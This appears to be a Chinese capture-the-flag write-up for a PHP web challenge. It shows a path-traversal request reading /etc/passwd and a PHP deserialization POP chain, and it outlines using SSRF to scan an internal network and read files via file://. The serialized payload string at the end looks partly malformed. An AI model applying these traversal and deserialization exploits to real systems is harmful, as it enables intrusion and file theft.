---
tags: [路径穿越, SESSION_UPLOAD_PROGRESS, PHP反序列化, POP链, RCE]
---

# easyweb

```
GET /showfile.php?f=./guest/../../../../../../../etc/passwd HTTP/1.1
Host: 47.104.95.124:8080
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like
Gecko) Chrome/103.0.0.0 Safari/537.36
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,
*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

读文件审计，利用SESSION_UPLOAD_PROGRESS上传文件，由于未public schema，可以直接进入get进行任意覆盖（当然也可以绕过wakeup）， popchain构造如下：

```
<?php
class Upload {
public $file;
public $filesize;
public $date;
public $tmp;
function __construct(){
$this->file = $_FILES["file"];
}
function __get($value){
$this->filesize->$value = $this->date;
echo $this->tmp;
}
}
class GuestShow{
public $file;
public function __construct($file)
{
$this->file=$file;
}
function __toString(){
$str = $this->file->name;
return "";
}
function __get($value){
return $this->$value;
}
function __destruct(){
echo $this;
}
}
class AdminShow{
public $source;
public $str;
public $filter;
public function __construct($file)
{
$this->source = $file;
$this->schema = 'file:///var/www/html/';
}
public function __toString()
{
$content = $this->str[0]->source;
$content = $this->str[1]->schema;
return $content;
}
public function __get($value){
$this->show();
return $this->$value;
}
public function __set($key,$value){
$this->$key = $value;
}
public function show(){
$url = $this->schema . $this->source;
echo $url;
}
public function __wakeup()
{
if ($this->schema !== 'file:///var/www/html/') {
$this->schema = 'file:///var/www/html/';
}
if ($this->source !== 'admin.png') {
$this->source = 'admin.png';
}
}
}
$a=new GuestShow("aa");
$c=new AdminShow("aa");
$c->source= 'zu876';
$a->file=$c;
echo serialize($a);
unserialize( 'O:9:"GuestShow":1:{s:4:"file";O:9:"AdminShow":4:
{s:6:"source";s:5:"zu876";s:3:"str";N;s:6:"filter";}');

```

然后就是利用show进行curl扫内网，最后在10段发现目标机器，然后file协议读即可。

